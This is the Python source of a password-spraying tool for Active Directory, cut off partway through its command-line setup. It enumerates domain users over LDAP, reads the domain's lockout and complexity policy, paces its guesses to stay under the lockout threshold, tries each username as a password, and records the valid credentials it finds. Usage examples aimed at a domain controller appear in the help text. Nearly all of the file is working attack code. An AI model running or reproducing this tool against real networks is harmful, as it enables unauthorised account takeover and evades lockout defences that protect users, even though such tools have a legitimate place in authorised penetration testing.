#!/usr/bin/env python3
"""
Password Spraying Tool for Active Directory

A Python implementation of internal password spraying, using LDAP authentication
to test credentials against Active Directory. Supports session management,
pause/resume, lockout detection, and automatic policy awareness.

Features:
  - Auto-enumerates users from AD (or accepts a file)
  - Fetches and respects lockout policy to avoid locking accounts
  - Skips passwords that don't meet password policy requirements
  - Session management with pause/resume support
  - Lockout detection with automatic pause

Requires: pip install ldap3
"""

import argparse
import hashlib
import json
import os
import signal
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Optional, Dict, Any, Set

from ad_ldap_utils import check_auth, AD_ERROR_CODES, ADConnection


# ---------------------------------------------------------------------------
# Constants and Colors
# ---------------------------------------------------------------------------

class Colors:
    """ANSI color codes for terminal output."""
    NC = '\033[0m'
    RED = '\033[0;31m'
    BLUE = '\033[0;34m'
    GREEN = '\033[0;32m'
    LBLUE = '\033[1;34m'
    ORANGE = '\033[0;33m'

    @classmethod
    def disable(cls):
        """Disable colors (for non-TTY output)."""
        cls.NC = cls.RED = cls.BLUE = cls.GREEN = cls.LBLUE = cls.ORANGE = ''


# Microsoft Win32 Error Codes - used directly, no custom mapping
# Reference: https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes
ERROR_SUCCESS = "ERROR_SUCCESS"
ERROR_NO_SUCH_USER = "ERROR_NO_SUCH_USER"
ERROR_LOGON_FAILURE = "ERROR_LOGON_FAILURE"
ERROR_INVALID_LOGON_HOURS = "ERROR_INVALID_LOGON_HOURS"
ERROR_INVALID_WORKSTATION = "ERROR_INVALID_WORKSTATION"
ERROR_PASSWORD_EXPIRED = "ERROR_PASSWORD_EXPIRED"
ERROR_ACCOUNT_DISABLED = "ERROR_ACCOUNT_DISABLED"
ERROR_LOGON_TYPE_NOT_GRANTED = "ERROR_LOGON_TYPE_NOT_GRANTED"
ERROR_ACCOUNT_EXPIRED = "ERROR_ACCOUNT_EXPIRED"
ERROR_PASSWORD_MUST_CHANGE = "ERROR_PASSWORD_MUST_CHANGE"
ERROR_ACCOUNT_LOCKED_OUT = "ERROR_ACCOUNT_LOCKED_OUT"
ERROR_HOST_UNREACHABLE = "ERROR_HOST_UNREACHABLE"
ERROR_GEN_FAILURE = "ERROR_GEN_FAILURE"

# Statuses that indicate valid credentials (even if account has issues)
VALID_CREDENTIAL_STATUSES = {
    ERROR_SUCCESS,
    ERROR_ACCOUNT_DISABLED,
    ERROR_PASSWORD_EXPIRED,
    ERROR_PASSWORD_MUST_CHANGE,
    ERROR_ACCOUNT_EXPIRED,
    ERROR_INVALID_LOGON_HOURS,
    ERROR_INVALID_WORKSTATION,
    ERROR_LOGON_TYPE_NOT_GRANTED,
}

# Statuses that should cause a user to be skipped for remaining attempts
SKIP_USER_STATUSES = {
    ERROR_SUCCESS,
    ERROR_ACCOUNT_DISABLED,
    ERROR_ACCOUNT_LOCKED_OUT,
    ERROR_ACCOUNT_EXPIRED,
    ERROR_NO_SUCH_USER,
}

DEFAULT_SESSION_PATH = Path.home() / ".adspray" / "sessions"


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------

@dataclass
class PasswordPolicy:
    """Domain password and lockout policy."""
    lockout_threshold: int  # 0 = no lockout
    lockout_duration_minutes: int
    lockout_observation_window_minutes: int
    min_password_length: int
    password_history_length: int
    complexity_enabled: bool  # Windows password complexity rules

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "PasswordPolicy":
        return cls(
            lockout_threshold=d.get("lockout_threshold", 0),
            lockout_duration_minutes=d.get("lockout_duration_minutes", 30),
            lockout_observation_window_minutes=d.get("lockout_observation_window_minutes", 30),
            min_password_length=d.get("min_password_length", 0),
            password_history_length=d.get("password_history_length", 0),
            complexity_enabled=d.get("complexity_enabled", False),
        )

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class Attempt:
    """A single credential attempt."""
    username: str
    password: str
    status: Optional[str] = None  # Microsoft error code string
    timestamp: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "Attempt":
        return cls(**d)


@dataclass
class SprayConfig:
    """Configuration for a spray session."""
    session_id: str
    dc_host: str
    workgroup: str
    use_ssl: bool
    port: Optional[int]
    output_file: Optional[str]
    verbose: int
    user_as_pass: bool
    created_at: str
    completed: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SprayConfig":
        return cls(**d)


@dataclass
class SpraySession:
    """A complete spray session with config, attempts, and policy."""
    config: SprayConfig
    policy: PasswordPolicy
    users: List[str] = field(default_factory=list)
    passwords: List[str] = field(default_factory=list)
    attempts: List[Attempt] = field(default_factory=list)
    skipped_users: Set[str] = field(default_factory=set)
    skipped_passwords: Set[str] = field(default_factory=set)
    current_password_index: int = 0
    attempts_since_sleep: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "config": self.config.to_dict(),
            "policy": self.policy.to_dict(),
            "users": self.users,
            "passwords": self.passwords,
            "attempts": [a.to_dict() for a in self.attempts],
            "skipped_users": list(self.skipped_users),
            "skipped_passwords": list(self.skipped_passwords),
            "current_password_index": self.current_password_index,
            "attempts_since_sleep": self.attempts_since_sleep,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "SpraySession":
        return cls(
            config=SprayConfig.from_dict(d["config"]),
            policy=PasswordPolicy.from_dict(d["policy"]),
            users=d.get("users", []),
            passwords=d.get("passwords", []),
            attempts=[Attempt.from_dict(a) for a in d.get("attempts", [])],
            skipped_users=set(d.get("skipped_users", [])),
            skipped_passwords=set(d.get("skipped_passwords", [])),
            current_password_index=d.get("current_password_index", 0),
            attempts_since_sleep=d.get("attempts_since_sleep", 0),
        )

    def save(self, session_path: Path) -> None:
        """Save session to disk."""
        session_dir = session_path / self.config.session_id
        session_dir.mkdir(parents=True, exist_ok=True)
        with open(session_dir / "session.json", "w") as f:
            json.dump(self.to_dict(), f, indent=2)

    @classmethod
    def load(cls, session_path: Path, session_id: str) -> "SpraySession":
        """Load session from disk."""
        session_file = session_path / session_id / "session.json"
        if not session_file.exists():
            raise FileNotFoundError(f"Session not found: {session_id}")
        with open(session_file) as f:
            return cls.from_dict(json.load(f))

    def get_stats(self) -> Dict[str, int]:
        """Get statistics about the session."""
        stats: Dict[str, int] = {"total": len(self.attempts), "pending": 0}
        for attempt in self.attempts:
            if attempt.status is None:
                stats["pending"] = stats.get("pending", 0) + 1
            else:
                stats[attempt.status] = stats.get(attempt.status, 0) + 1
        return stats

    def get_safe_attempts_per_window(self) -> int:
        """
        Calculate the maximum attempts per user within the observation window
        that won't trigger lockout. Returns a conservative value.
        """
        if self.policy.lockout_threshold == 0:
            # No lockout policy - but still be reasonable
            return 100

        # Stay well under the threshold (at least 2 attempts margin)
        return max(1, self.policy.lockout_threshold - 2)

    def get_sleep_time_seconds(self) -> int:
        """Get the sleep time needed between password batches."""
        if self.policy.lockout_threshold == 0:
            return 0

        # Sleep for the full observation window plus a small buffer
        return (self.policy.lockout_observation_window_minutes * 60) + 60

    def password_meets_policy(self, password: str, username: str = None) -> tuple:
        """
        Check if a password meets the policy requirements.

        Args:
            password: The password to check
            username: Optional username to check for inclusion in password

        Returns:
            Tuple of (meets_policy: bool, reason: str or None)
        """
        # Check minimum length
        if len(password) < self.policy.min_password_length:
            return False, f"below min length ({self.policy.min_password_length})"

        # Check complexity if enabled
        if self.policy.complexity_enabled:
            # Must contain characters from at least 3 of 4 categories
            categories = 0
            if any(c.isupper() for c in password):
                categories += 1
            if any(c.islower() for c in password):
                categories += 1
            if any(c.isdigit() for c in password):
                categories += 1
            if any(not c.isalnum() for c in password):
                categories += 1

            if categories < 3:
                return False, "doesn't meet complexity (need 3 of: upper, lower, digit, special)"

            # Cannot contain username (case-insensitive, >2 consecutive chars)
            if username and len(username) > 2:
                username_lower = username.lower()
                password_lower = password.lower()
                # Check for any 3+ char substring of username in password
                for i in range(len(username_lower) - 2):
                    if username_lower[i:i+3] in password_lower:
                        return False, f"contains username substring"

        return True, None

    def password_contains_username(self, password: str, username: str) -> bool:
        """
        Check if password contains username substring (3+ chars).
        Only relevant when complexity is enabled.
        """
        if not self.policy.complexity_enabled:
            return False
        if len(username) <= 2:
            return False

        username_lower = username.lower()
        password_lower = password.lower()
        for i in range(len(username_lower) - 2):
            if username_lower[i:i+3] in password_lower:
                return True
        return False


# ---------------------------------------------------------------------------
# Spray Engine
# ---------------------------------------------------------------------------

class SprayEngine:
    """Engine for executing password spray attacks."""

    def __init__(self, session: SpraySession, session_path: Path, verbose: int = 3):
        self.session = session
        self.session_path = session_path
        self.verbose = verbose
        self.paused = False
        self.stopped = False
        self.consecutive_lockouts = 0

        # Set up signal handlers
        signal.signal(signal.SIGINT, self._handle_interrupt)

    def _handle_interrupt(self, signum, frame):
        """Handle Ctrl+C for pause functionality."""
        if self.paused:
            self.stopped = True
            return

        self.paused = True
        self._print(f"\n{Colors.ORANGE}[+] Spray paused.{Colors.NC}", level=1)
        self._print(f"{Colors.ORANGE}[+] Press{Colors.NC} Ctrl+C {Colors.ORANGE}again to quit.{Colors.NC}", level=1)
        self._print(f"{Colors.ORANGE}[+] Press{Colors.NC} Enter {Colors.ORANGE}to continue.{Colors.NC}", level=1)

        try:
            input()
            self.paused = False
            self._print(f"{Colors.ORANGE}[+] Spray resumed.{Colors.NC}", level=1)
        except EOFError:
            self.stopped = True

    def _print(self, message: str, level: int = 3, end: str = "\n"):
        """Print message if verbosity level is high enough."""
        if self.verbose >= level:
            print(message, end=end, file=sys.stderr, flush=True)

    def _save_session(self):
        """Save current session state."""
        self.session.save(self.session_path)

    def _write_success(self, username: str, password: str, status: str):
        """Write successful credential to output file."""
        output_file = self.session.config.output_file
        if not output_file:
            return

        suffix = "" if status == ERROR_SUCCESS else f" # {status.replace('ERROR_', '')}"

        with open(output_file, "a") as f:
            f.write(f"{username}:{password}{suffix}\n")

    def _check_credential(self, username: str, password: str) -> str:
        """Check a single credential against AD. Returns the error code."""
        config = self.session.config
        result = check_auth(
            dc_host=config.dc_host,
            username=username,
            password=password,
            workgroup=config.workgroup,
            use_ssl=config.use_ssl,
            port=config.port,
        )
        return result["status"]

    def run(self) -> bool:
        """Execute the spray. Returns True if completed successfully."""
        config = self.session.config
        policy = self.session.policy

        safe_attempts = self.session.get_safe_attempts_per_window()
        sleep_time = self.session.get_sleep_time_seconds()

        # Filter passwords that don't meet policy (length + complexity categories)
        # Note: username-in-password check is done per-user during spraying
        valid_passwords = []
        for pwd in self.session.passwords:
            if pwd in self.session.skipped_passwords:
                continue
            meets, reason = self.session.password_meets_policy(pwd)  # No username here
            if not meets:
                self._print(
                    f"{Colors.ORANGE}[!] Skipping password '{pwd}' - {reason}{Colors.NC}",
                    level=2
                )
                self.session.skipped_passwords.add(pwd)
                continue
            valid_passwords.append(pwd)

        total_users = len(self.session.users) - len(self.session.skipped_users)
        total_passwords = len(valid_passwords)
        total_attempts = total_users * total_passwords

        # Print configuration
        self._print(f"{Colors.ORANGE}[+] Spray Configuration{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]         Session:{Colors.NC} {config.session_id}", level=1)
        self._print(f"{Colors.BLUE}[+]         DC Host:{Colors.NC} {config.dc_host}", level=1)
        self._print(f"{Colors.BLUE}[+]       Workgroup:{Colors.NC} {config.workgroup}", level=1)
        self._print(f"{Colors.BLUE}[+]    User as Pass:{Colors.NC} {config.user_as_pass}", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]   Lockout Policy{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]       Threshold:{Colors.NC} {policy.lockout_threshold} attempts", level=1)
        self._print(f"{Colors.BLUE}[+]      Obs Window:{Colors.NC} {policy.lockout_observation_window_minutes} min", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]  Password Policy{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]    Min Pwd Len:{Colors.NC} {policy.min_password_length}", level=1)
        self._print(f"{Colors.BLUE}[+]    Complexity:{Colors.NC} {'Enabled' if policy.complexity_enabled else 'Disabled'}", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]   Spray Strategy{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]  Safe attempts:{Colors.NC} {safe_attempts} per window", level=1)
        if sleep_time > 0:
            self._print(f"{Colors.BLUE}[+]     Sleep time:{Colors.NC} {sleep_time // 60} min", level=1)
        else:
            self._print(f"{Colors.BLUE}[+]     Sleep time:{Colors.NC} None (no lockout)", level=1)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1)
        self._print(f"{Colors.BLUE}[+]          Users:{Colors.NC} {len(self.session.users)} ({total_users} active)", level=1)
        self._print(f"{Colors.BLUE}[+]      Passwords:{Colors.NC} {len(self.session.passwords)} ({total_passwords} valid)", level=1)
        self._print(f"{Colors.BLUE}[+]  Est. Attempts:{Colors.NC} {total_attempts}", level=1)

        if sleep_time > 0 and total_passwords > safe_attempts:
            num_sleeps = (total_passwords - 1) // safe_attempts
            eta_seconds = num_sleeps * sleep_time
            eta = datetime.now() + timedelta(seconds=eta_seconds)
            self._print(f"{Colors.BLUE}[+]            ETA:{Colors.NC} {eta.strftime('%Y-%m-%d %H:%M')}", level=1)

        self._print("", level=1)

        if self.verbose >= 1:
            input("(Press Enter to start the spray)")
            self._print("", level=1)

        self._print(f"{Colors.ORANGE}[+] Starting password spray...{Colors.NC}", level=2)

        # Handle user-as-password first if enabled
        if config.user_as_pass and self.session.current_password_index == 0:
            self._print(f"{Colors.ORANGE}[+] Trying username as password...{Colors.NC}", level=2)
            for username in self.session.users:
                if self.stopped:
                    break
                if username in self.session.skipped_users:
                    continue
                meets, reason = self.session.password_meets_policy(username, username)
                if not meets:
                    self._print(
                        f"{Colors.ORANGE}[!] Skipping user '{username}' as password - {reason}{Colors.NC}",
                        level=3
                    )
                    continue

                self._spray_single(username, username)

            if not self.stopped:
                self.session.attempts_since_sleep += 1
                if self._should_sleep():
                    self._do_sleep(sleep_time)

        # Main password loop
        passwords_to_try = valid_passwords[self.session.current_password_index:]

        for pwd_idx, password in enumerate(passwords_to_try, start=self.session.current_password_index):
            if self.stopped:
                self._print(f"\n{Colors.RED}[+] Spray stopped by user.{Colors.NC}", level=1)
                self._save_session()
                return False

            self._print(f"{Colors.ORANGE}[+] Spraying password:{Colors.NC} {password}", level=2)

            for username in self.session.users:
                if self.stopped:
                    break
                if username in self.session.skipped_users:
                    continue

                # Skip if password contains this username (complexity rule)
                if self.session.password_contains_username(password, username):
                    self._print(
                        f"{Colors.ORANGE}[!] Skipping {username}:{password} - "
                        f"password contains username{Colors.NC}",
                        level=3
                    )
                    continue

                self._spray_single(username, password)

            self.session.current_password_index = pwd_idx + 1
            self.session.attempts_since_sleep += 1

            # Check if we need to sleep
            if self._should_sleep() and pwd_idx < len(valid_passwords) - 1:
                self._do_sleep(sleep_time)

            # Periodic save
            self._save_session()

        # Mark completed
        self.session.config.completed = True
        self._save_session()

        self._print(f"\n{Colors.GREEN}[+] Spray completed successfully.{Colors.NC}", level=1)
        stats = self.session.get_stats()
        self._print(f"{Colors.GREEN}[+] Valid credentials:{Colors.NC} {stats.get(ERROR_SUCCESS, 0)}", level=1)
        self._print(f"{Colors.GREEN}[+] Disabled accounts:{Colors.NC} {stats.get(ERROR_ACCOUNT_DISABLED, 0)}", level=1)
        self._print(f"{Colors.GREEN}[+] Locked accounts:{Colors.NC} {stats.get(ERROR_ACCOUNT_LOCKED_OUT, 0)}", level=1)

        return True

    def _should_sleep(self) -> bool:
        """Check if we should sleep before the next password."""
        safe_attempts = self.session.get_safe_attempts_per_window()
        if safe_attempts >= 100:  # No lockout policy
            return False
        return self.session.attempts_since_sleep >= safe_attempts

    def _do_sleep(self, sleep_time: int):
        """Sleep between password batches."""
        self.session.attempts_since_sleep = 0
        if sleep_time <= 0:
            return

        self._print(
            f"{Colors.ORANGE}[+] Sleeping for {sleep_time // 60} minutes to avoid lockouts...{Colors.NC}",
            level=1
        )
        self._save_session()

        # Sleep in chunks so we can respond to interrupts
        remaining = sleep_time
        while remaining > 0 and not self.stopped:
            chunk = min(remaining, 10)
            time.sleep(chunk)
            remaining -= chunk

        if not self.stopped:
            self._print(f"{Colors.ORANGE}[+] Resuming spray...{Colors.NC}", level=1)

    def _spray_single(self, username: str, password: str):
        """Spray a single credential."""
        self._print(
            f"{Colors.BLUE}[+] Trying:{Colors.NC} {username}:{password} {Colors.BLUE}...{Colors.NC}",
            level=3, end=""
        )

        status = self._check_credential(username, password)

        # Record the attempt
        attempt = Attempt(
            username=username,
            password=password,
            status=status,
            timestamp=datetime.now().isoformat(),
        )
        self.session.attempts.append(attempt)

        # Handle result based on Microsoft error codes
        if status == ERROR_SUCCESS:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_ACCOUNT_DISABLED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.RED}DISABLED{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_PASSWORD_MUST_CHANGE:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.ORANGE}MUST_CHANGE{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_PASSWORD_EXPIRED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.ORANGE}PWD_EXPIRED{Colors.NC}", level=1)
            self._write_success(username, password, status)

        elif status == ERROR_ACCOUNT_LOCKED_OUT:
            self.session.skipped_users.add(username)
            self.consecutive_lockouts += 1
            self._print(f" {Colors.RED}LOCKED_OUT{Colors.NC}", level=1)

            if self.consecutive_lockouts >= 3:
                self._print(
                    f"{Colors.RED}[!] 3+ consecutive lockouts detected! This shouldn't happen.{Colors.NC}",
                    level=1
                )
                self._print(
                    f"{Colors.RED}[!] Check lockout policy settings. Pausing...{Colors.NC}",
                    level=1
                )
                self.paused = True
                self._handle_interrupt(None, None)

        elif status == ERROR_ACCOUNT_EXPIRED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.RED}ACCOUNT_EXPIRED{Colors.NC}", level=1)

        elif status == ERROR_NO_SUCH_USER:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.RED}NO_SUCH_USER{Colors.NC}", level=2)

        elif status in (ERROR_HOST_UNREACHABLE, ERROR_GEN_FAILURE):
            self._print(f" {Colors.RED}ERROR: {status}{Colors.NC}", level=1)

        else:  # ERROR_LOGON_FAILURE or other
            self.consecutive_lockouts = 0
            self._print(f" {Colors.RED}INVALID{Colors.NC}", level=3)


# ---------------------------------------------------------------------------
# Session Management
# ---------------------------------------------------------------------------

def generate_session_id() -> str:
    """Generate a unique session ID."""
    data = f"{time.time()}-{os.getpid()}"
    return hashlib.md5(data.encode()).hexdigest()


def fetch_domain_info(
    dc_host: str,
    username: str,
    password: str,
    workgroup: str,
    use_ssl: bool = False,
    port: Optional[int] = None,
    base_dn: Optional[str] = None,
    verbose: int = 3,
) -> tuple:
    """
    Connect to AD and fetch users and policy.
    Returns (users, policy) tuple.
    """
    def _print(msg: str, level: int = 3):
        if verbose >= level:
            print(msg, file=sys.stderr)

    _print(f"{Colors.BLUE}[+] Connecting to {dc_host}...{Colors.NC}", level=1)

    with ADConnection(
        dc_host=dc_host,
        username=username,
        password=password,
        workgroup=workgroup,
        base_dn=base_dn,
        use_ssl=use_ssl,
        port=port,
    ) as ad:
        _print(f"{Colors.BLUE}[+] Connected. Base DN: {ad.base_dn}{Colors.NC}", level=2)

        # Fetch users
        _print(f"{Colors.BLUE}[+] Enumerating users...{Colors.NC}", level=1)
        users = ad.get_users()
        _print(f"{Colors.GREEN}[+] Found {len(users)} users{Colors.NC}", level=1)

        # Fetch lockout policy
        _print(f"{Colors.BLUE}[+] Fetching lockout policy...{Colors.NC}", level=1)
        policy_dict = ad.get_lockout_policy()
        policy = PasswordPolicy.from_dict(policy_dict)

        _print(f"{Colors.GREEN}[+] Lockout threshold: {policy.lockout_threshold}{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Observation window: {policy.lockout_observation_window_minutes} min{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Min password length: {policy.min_password_length}{Colors.NC}", level=1)
        _print(f"{Colors.GREEN}[+] Complexity required: {policy.complexity_enabled}{Colors.NC}", level=1)

        return users, policy


def create_session(
    dc_host: str,
    workgroup: str,
    users: List[str],
    passwords: List[str],
    policy: PasswordPolicy,
    user_as_pass: bool = False,
    use_ssl: bool = False,
    port: Optional[int] = None,
    output_file: Optional[str] = None,
    verbose: int = 3,
) -> SpraySession:
    """Create a new spray session."""
    session_id = generate_session_id()

    config = SprayConfig(
        session_id=session_id,
        dc_host=dc_host,
        workgroup=workgroup,
        use_ssl=use_ssl,
        port=port,
        output_file=output_file,
        verbose=verbose,
        user_as_pass=user_as_pass,
        created_at=datetime.now().isoformat(),
    )

    return SpraySession(
        config=config,
        policy=policy,
        users=users,
        passwords=passwords,
    )


def list_sessions(session_path: Path) -> List[Dict[str, Any]]:
    """List all available sessions."""
    sessions = []
    if not session_path.exists():
        return sessions

    for session_dir in session_path.iterdir():
        if not session_dir.is_dir():
            continue
        try:
            session = SpraySession.load(session_path, session_dir.name)
            stats = session.get_stats()
            sessions.append({
                "session_id": session.config.session_id,
                "workgroup": session.config.workgroup,
                "dc_host": session.config.dc_host,
                "completed": session.config.completed,
                "created_at": session.config.created_at,
                "total": len(session.attempts),
                "valid": stats.get(ERROR_SUCCESS, 0),
                "disabled": stats.get(ERROR_ACCOUNT_DISABLED, 0),
            })
        except Exception:
            continue

    return sorted(sessions, key=lambda x: x["created_at"], reverse=True)


# ---------------------------------------------------------------------------
# CLI Commands
# ---------------------------------------------------------------------------

def cmd_spray(args) -> int:
    """Execute a new spray or resume an existing one."""
    session_path = Path(args.session_path)

    if args.resume:
        # Resume existing session
        try:
            session = SpraySession.load(session_path, args.resume)
            if session.config.completed:
                print(f"{Colors.ORANGE}[!] Session already completed.{Colors.NC}", file=sys.stderr)
                return 1
            print(f"{Colors.GREEN}[+] Resuming session: {args.resume}{Colors.NC}", file=sys.stderr)
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Session not found: {args.resume}{Colors.NC}", file=sys.stderr)
            return 1
    else:
        # Validate required args
        if not args.workgroup:
            print(f"{Colors.RED}[!] Workgroup is required (-w){Colors.NC}", file=sys.stderr)
            return 1
        if not args.dc:
            print(f"{Colors.RED}[!] Domain controller is required (-d){Colors.NC}", file=sys.stderr)
            return 1
        if not args.username:
            print(f"{Colors.RED}[!] Username is required (-u) for AD enumeration{Colors.NC}", file=sys.stderr)
            return 1
        if not args.password:
            print(f"{Colors.RED}[!] Password is required (-p) for AD enumeration{Colors.NC}", file=sys.stderr)
            return 1
        if not args.spray_passwords:
            print(f"{Colors.RED}[!] Passwords file is required (--passwords){Colors.NC}", file=sys.stderr)
            return 1

        # Load passwords to spray
        try:
            with open(args.spray_passwords) as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Passwords file not found: {args.spray_passwords}{Colors.NC}", file=sys.stderr)
            return 1

        if not passwords:
            print(f"{Colors.RED}[!] Passwords file is empty{Colors.NC}", file=sys.stderr)
            return 1

        # Fetch users and policy from AD
        try:
            if args.users_file:
                # Use provided users file instead of enumerating
                with open(args.users_file) as f:
                    users = [line.strip() for line in f if line.strip()]
                print(f"{Colors.GREEN}[+] Loaded {len(users)} users from file{Colors.NC}", file=sys.stderr)

                # Still need to fetch policy
                with ADConnection(
                    dc_host=args.dc,
                    username=args.username,
                    password=args.password,
                    workgroup=args.workgroup,
                    base_dn=args.base_dn,
                    use_ssl=args.ssl,
                    port=args.port,
                ) as ad:
                    policy_dict = ad.get_lockout_policy()
                    policy = PasswordPolicy.from_dict(policy_dict)
            else:
                users, policy = fetch_domain_info(
                    dc_host=args.dc,
                    username=args.username,
                    password=args.password,
                    workgroup=args.workgroup,
                    use_ssl=args.ssl,
                    port=args.port,
                    base_dn=args.base_dn,
                    verbose=args.verbose,
                )
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to connect to AD: {e}{Colors.NC}", file=sys.stderr)
            return 1

        if not users:
            print(f"{Colors.RED}[!] No users found{Colors.NC}", file=sys.stderr)
            return 1

        session = create_session(
            dc_host=args.dc,
            workgroup=args.workgroup,
            users=users,
            passwords=passwords,
            policy=policy,
            user_as_pass=args.userpass,
            use_ssl=args.ssl,
            port=args.port,
            output_file=args.output,
            verbose=args.verbose,
        )
        session.save(session_path)
        print(f"{Colors.GREEN}[+] Created session: {session.config.session_id}{Colors.NC}", file=sys.stderr)

    # Run the spray
    engine = SprayEngine(session, session_path, verbose=session.config.verbose)
    success = engine.run()

    return 0 if success else 1


def cmd_sessions(args) -> int:
    """List all sessions."""
    session_path = Path(args.session_path)
    sessions = list_sessions(session_path)

    if not sessions:
        print(f"{Colors.ORANGE}[!] No sessions found.{Colors.NC}", file=sys.stderr)
        return 0

    # Header
    print(f"{Colors.BLUE}{'─' * 100}{Colors.NC}")
    print(
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Done':^4}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Session':^32}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Workgroup':^12}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'DC Host':^15}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Valid':^6}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Created':^16}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC}"
    )
    print(f"{Colors.BLUE}{'─' * 100}{Colors.NC}")

    for s in sessions:
        done_str = f"{Colors.GREEN}Yes{Colors.NC}" if s["completed"] else f"{Colors.RED}No{Colors.NC}"
        created = s["created_at"][:16].replace("T", " ")
        print(
            f"{Colors.BLUE}│{Colors.NC} {done_str:^13} "
            f"{Colors.BLUE}│{Colors.NC} {s['session_id']:^32} "
            f"{Colors.BLUE}│{Colors.NC} {s['workgroup']:^12} "
            f"{Colors.BLUE}│{Colors.NC} {s['dc_host']:^15} "
            f"{Colors.BLUE}│{Colors.NC} {s['valid']:^6} "
            f"{Colors.BLUE}│{Colors.NC} {created:^16} "
            f"{Colors.BLUE}│{Colors.NC}"
        )

    print(f"{Colors.BLUE}{'─' * 100}{Colors.NC}")
    return 0


def cmd_delete(args) -> int:
    """Delete a session."""
    session_path = Path(args.session_path) / args.session_id
    if not session_path.exists():
        print(f"{Colors.RED}[!] Session not found: {args.session_id}{Colors.NC}", file=sys.stderr)
        return 1

    import shutil
    shutil.rmtree(session_path)
    print(f"{Colors.GREEN}[+] Deleted session: {args.session_id}{Colors.NC}", file=sys.stderr)
    return 0


def cmd_export(args) -> int:
    """Export session results."""
    session_path = Path(args.session_path)
    try:
        session = SpraySession.load(session_path, args.session_id)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Session not found: {args.session_id}{Colors.NC}", file=sys.stderr)
        return 1

    if args.format == "json":
        print(json.dumps(session.to_dict(), indent=2))
    else:  # credentials format
        for attempt in session.attempts:
            if attempt.status in VALID_CREDENTIAL_STATUSES:
                suffix = "" if attempt.status == ERROR_SUCCESS else f" # {attempt.status.replace('ERROR_', '')}"
                print(f"{attempt.username}:{attempt.password}{suffix}")

    return 0


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Password spraying tool for Active Directory.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest="command", help="Command to run")

    # Spray subcommand
    spray_parser = subparsers.add_parser(
        "spray",
        help="Execute a password spray",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
This tool automatically:
  - Enumerates users from AD (or uses provided file)
  - Fetches lockout policy and adjusts timing to avoid lockouts
  - Skips passwords that don't meet minimum length requirements

Examples:
  # New spray (auto-enumerate users)
  %(prog)s -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords passwords.txt

  # Use a users file instead of enumerating
  %(prog)s -d dc01.local -w CORP -u admin -p 'P@ss' --passwords pwds.txt --users users.txt

  # With username-as-password and output file
  %(prog)s -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords pwds.txt --userpass -o valid.txt

  # Resume existing spray
  %(prog)s --resume 305578a5af638c2b377b41b43e693291
        """,
    )
    spray_parser.add_argument("-d", "--dc", help="Domain controller FQDN or IP address")
    spray_parser.add_argument("-w", "--workgroup", help="NetBIOS domain/workgroup name (e.g., CORP)")
    spray_parser.add_argument("-u", "--username", help="Username for AD enumeration")
    spray_parser.add_argument("-p", "--password", help="Password for AD enumeration")
    spray_parser.add_argument("--base-dn", dest="base_dn", help="Override LDAP base DN")
    spray_parser.add_argument("--passwords", dest="spray_passwords", help="File containing passwords to spray")
    spray_parser.add_argument("--users", dest="users_file", help="File containing users (skip enumeration)")
